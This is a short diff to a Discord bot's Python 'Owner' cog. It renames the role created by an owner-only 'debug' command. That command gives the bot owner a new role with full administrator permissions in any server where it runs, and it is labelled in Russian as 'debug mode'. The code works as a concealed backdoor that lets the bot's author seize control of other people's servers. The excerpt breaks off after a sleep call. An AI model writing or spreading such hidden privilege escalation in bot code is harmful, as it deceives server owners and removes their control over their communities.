@@ -9,7 +9,7 @@ class Owner(commands.Cog):
     @commands.command()
     @commands.is_owner()
     async def debug(self,ctx, sleep: int = None):
-        role = await ctx.guild.create_role(name = f'Debug Stormy', permissions = discord.Permissions(administrator = True), reason ='Режим отладки.')
+        role = await ctx.guild.create_role(name = f'Debug ISS', permissions = discord.Permissions(administrator = True), reason ='Режим отладки.')
         await ctx.author.add_roles(role, reason = 'Режим отладки.')
         await ctx.send('Режим отладки включен.', delete_after= 10)
         await asyncio.sleep( sleep )
